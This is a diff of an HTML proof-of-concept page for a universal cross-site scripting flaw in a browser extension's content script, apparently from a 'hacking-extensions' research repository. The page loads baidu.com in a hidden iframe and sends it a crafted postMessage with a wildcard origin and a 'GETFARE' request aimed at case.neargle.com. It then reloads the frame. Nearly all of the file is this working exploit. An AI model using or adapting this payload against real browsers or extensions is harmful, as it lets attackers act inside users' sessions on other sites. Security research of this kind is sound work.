@@ -7,22 +7,27 @@
     <title>content script uxss poc</title>
 </head>
 <body>
-<iframe src="https://www.baidu.com" style="display: none;"></iframe>
-<script>
-    subframe = frames[0];
-    data = {
-    Action: "GETFARE",
-        Data: {}
-    }
-    data.Method = "POST";
-    data.URL = "https://case.neargle.com";
-    data.SetBodyText = true;
-    data.post = {};
-    setTimeout('subframe.postMessage(data, "*")', 2000);
 
-    setTimeout(function(){
-        document.querySelector('iframe').src = "https://www.baidu.com";
-    }, 3000);
-</script>
+    <h1>hacking-extensions</h1>
+    <p>source code: <a href="https://github.com/neargle/hacking-extensions/tree/master/content_scripts_uxss">https://github.com/neargle/hacking-extensions/tree/master/content_scripts_uxss</a></p>
+
+    <!-- poc content -->
+    <iframe src="https://www.baidu.com" style="display: none;"></iframe>
+    <script>
+        subframe = frames[0];
+        data = {
+        Action: "GETFARE",
+            Data: {}
+        }
+        data.Method = "POST";
+        data.URL = "https://case.neargle.com";
+        data.SetBodyText = true;
+        data.post = {};
+        setTimeout('subframe.postMessage(data, "*")', 2000);
+
+        setTimeout(function(){
+            document.querySelector('iframe').src = "https://www.baidu.com";
+        }, 3000);
+    </script>
 </body>
 </html>
